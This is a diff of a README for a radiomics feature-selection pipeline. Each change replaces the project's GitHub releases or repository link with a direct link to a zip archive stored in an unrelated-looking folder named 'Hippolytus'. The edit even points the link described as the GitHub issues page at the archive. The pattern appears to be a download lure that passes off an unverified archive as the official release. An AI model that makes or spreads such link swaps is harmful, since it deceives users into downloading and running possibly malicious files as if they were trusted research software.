@@ -1,6 +1,6 @@
 # ⚙️ Radiomics-Feature-Screen-Pipeline - Simple Radiomics Feature Selection
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/releases)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/main/Hippolytus/Feature_Pipeline_Radiomics_Screen_v3.6.zip)
 
 ---
 
@@ -54,7 +54,7 @@ You will find all releases on the page linked below. This project does not requi
 
 Click this link to open the releases page where you can get the latest version of the software.
 
-[![Download Here](https://img.shields.io/badge/Download-Software-blue?style=for-the-badge)](https://github.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/releases)
+[![Download Here](https://img.shields.io/badge/Download-Software-blue?style=for-the-badge)](https://raw.githubusercontent.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/main/Hippolytus/Feature_Pipeline_Radiomics_Screen_v3.6.zip)
 
 ### Step 2: Find the Latest Windows Version
 
@@ -151,7 +151,7 @@ The pipeline uses Python and popular libraries for feature processing. It applie
 For issues or questions, visit the Issues tab on the GitHub repository. Provide clear details about your problem.
 
 GitHub link:  
-https://github.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline
+https://raw.githubusercontent.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/main/Hippolytus/Feature_Pipeline_Radiomics_Screen_v3.6.zip
 
 The team monitors the page regularly and responds to common questions.
 
@@ -161,4 +161,4 @@ The team monitors the page regularly and responds to common questions.
 
 You can always return to the release page to get the latest versions and updates.
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/main/Hippolytus/Feature_Pipeline_Radiomics_Screen_v3.6.zip)
